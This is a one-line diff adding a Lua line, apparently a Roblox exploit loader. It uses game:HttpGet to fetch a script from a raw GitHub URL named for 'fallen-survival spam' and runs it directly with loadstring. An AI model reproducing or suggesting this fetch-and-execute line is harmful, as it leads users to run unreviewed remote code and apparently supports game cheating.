@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/highwaymarevibrate/loaders/main/loaders/new-map-fallen-survival-spam2-dihim8rrjr986r.lua"))()
